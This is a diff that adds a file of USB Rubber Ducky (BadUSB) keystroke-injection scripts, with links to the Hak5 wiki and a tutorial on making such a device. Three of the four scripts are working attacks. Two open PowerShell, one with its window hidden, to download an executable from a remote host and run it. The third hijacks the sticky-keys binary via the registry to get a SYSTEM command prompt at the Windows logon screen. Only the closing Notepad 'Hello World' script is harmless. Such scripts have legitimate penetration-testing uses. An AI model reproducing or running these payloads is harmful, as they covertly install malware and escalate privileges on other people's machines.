@@ -1,0 +1,58 @@
+-----------------
+ SCRIPT BAD USB
+-----------------
+DELAY 2000
+GUI r
+DELAY 1000
+STRING powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('http://10.0.0.9/shell.exe','%TEMP%\shell.exe'); Start-Process "%TEMP%\shell.exe"
+ENTER
+
+
+====================
+ Download & Execute
+====================
+
+An example of using Powershell to download a file from the web and then execute it.
+ 
+ DELAY 3000
+ GUI r
+ DELAY 100
+ STRING powershell (new-object System.Net.WebClient).DownloadFile('http://example.com/bob.old','%TEMP%\bob.exe');
+ DELAY 100
+ STRING Start-Process "%TEMP%\bob.exe"
+ ENTER
+
+
+:: Attacking Windows At The Logon Screen, Gaining Access To CMD With System Privileges ::
+
+DELAY 400
+ESCAPE
+DELAY 200
+CONTROL ESCAPE
+DELAY 750
+STRING cmd.exe /c "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f"
+DELAY 750
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
+
+https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Attacking-Windows-At-The-Logon-Screen,---Gaining-Access-To-CMD-With-System-Privileges.
+
+
+======================
+ TESTING HELLO WORLD
+======================
+
+ DELAY 3000
+ GUI r
+ DELAY 200
+ STRING notepad
+ ENTER
+ DELAY 200
+ STRING Hello World!!!
+ ENTER
+
+
+
+
+https://www.pentestingshop.com/pentesting/make-your-own-usb-rubber-ducky-using-a-normal-usb-stick/
